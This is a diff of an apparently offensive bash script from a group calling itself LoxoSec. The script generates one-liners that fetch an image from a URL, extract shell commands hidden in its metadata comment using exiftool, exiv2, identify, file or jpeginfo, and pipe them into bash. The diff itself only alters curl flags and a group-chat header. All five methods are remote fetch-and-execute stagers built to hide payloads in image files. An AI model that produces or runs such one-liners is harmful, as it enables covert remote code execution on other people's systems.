@@ -3,7 +3,7 @@
 # LoxoSec
 # git5
 #------------------------------------------------
-# Whatsapp group
+# Whatsapp group (Latin/Hispanic/International)
 # https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
 # ------------------------------------------------
 # Website
@@ -58,31 +58,31 @@ read -p "Enter the method number (1-5): " method_choice
 case "$method_choice" in
     1)
         echo -e "\e[34mGenerating one-liner method with exiftool..."
-        one_liner="curl -sS '$image_url' | exiftool -Comment -b - | bash"
+        one_liner="curl -s '$image_url' | exiftool -Comment -b - | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
     2)
         echo -e "\e[34mGenerating one-liner method with exiv2..."
-        one_liner="curl -sS '$image_url' | exiv2 -p c | bash"
+        one_liner="curl -s '$image_url' | exiv2 -p c | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
     3)
         echo -e "\e[34mGenerating one-liner method with identify..."
-        one_liner="curl -sS '$image_url' | identify -format '%c' | bash"
+        one_liner="curl -s '$image_url' | identify -format '%c' | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
     4)
         echo -e "\e[34mGenerating one-liner method with file and grep..."
-        one_liner="curl -sS '$image_url' | file - | grep -o 'comment: \".*\"' | bash"
+        one_liner="curl -s '$image_url' | file - | grep -o 'comment: \".*\"' | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
     5)
         echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
-        one_liner="curl -sS '$image_url' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
+        one_liner="curl -s '$image_url' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
